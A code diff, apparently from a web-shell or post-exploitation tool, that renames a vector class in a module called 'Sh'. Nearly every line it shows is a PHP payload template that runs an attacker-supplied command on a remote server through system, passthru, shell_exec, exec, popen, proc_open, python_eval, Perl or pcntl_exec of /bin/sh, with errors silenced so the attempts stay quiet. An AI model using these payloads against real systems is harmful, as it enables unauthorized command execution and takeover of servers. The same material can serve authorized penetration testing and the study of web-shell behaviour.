@@ -1,4 +1,4 @@
-from core.vectors import PhpCmd
+from core.vectors import PhpCode
 from core.module import Module, Status
 from core.loggers import log
 from core.vectors import Os
@@ -24,17 +24,17 @@ class Sh(Module):
         self.register_vectors(
             [
             # All the system-like calls has to be properly wrapped between single quotes
-            PhpCmd("""@system('${command}${stderr_redirection}');""", "system"),
-            PhpCmd("""@passthru('${command}${stderr_redirection}');""", "passthru"),
-            PhpCmd("""print(@shell_exec('${command}${stderr_redirection}'));""", "shell_exec"),
-            PhpCmd("""$r=array(); @exec('${command}${stderr_redirection}', $r);print(join(\"\\n\",$r));""", "exec"),
-            PhpCmd("""
+            PhpCode("""@system('${command}${stderr_redirection}');""", "system"),
+            PhpCode("""@passthru('${command}${stderr_redirection}');""", "passthru"),
+            PhpCode("""print(@shell_exec('${command}${stderr_redirection}'));""", "shell_exec"),
+            PhpCode("""$r=array(); @exec('${command}${stderr_redirection}', $r);print(join(\"\\n\",$r));""", "exec"),
+            PhpCode("""
                 $h=@popen('${command}','r');
                 if($h){
                     while(!feof($h)) echo(fread($h,4096));
                     pclose($h);
                 }""", "popen"),
-            PhpCmd("""
+            PhpCode("""
                 $p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));
                 $h = @proc_open('${command}', $p, $pipes);
                 if($h&&$pipes){
@@ -45,15 +45,15 @@ class Sh(Module):
                     fclose($pipes[2]);
                     proc_close($h);
                 }""", "proc_open"),
-            PhpCmd("""@python_eval('import os; os.system('${command}${stderr_redirection}');');""", "python_eval"),
-            PhpCmd("""
+            PhpCode("""@python_eval('import os; os.system('${command}${stderr_redirection}');');""", "python_eval"),
+            PhpCode("""
                 if(class_exists('Perl')){
                     $perl=new Perl();
                     $r=$perl->system('${command}${stderr_redirection}');
                     print($r);
                 }""", "perl_system"),
             # pcntl_fork is unlikely, cause is callable just as CGI or from CLI.
-            PhpCmd("""
+            PhpCode("""
                 $p=@pcntl_fork();
                 if(!$p){
                     @pcntl_exec("/bin/sh",Array("-c",'${command}'));
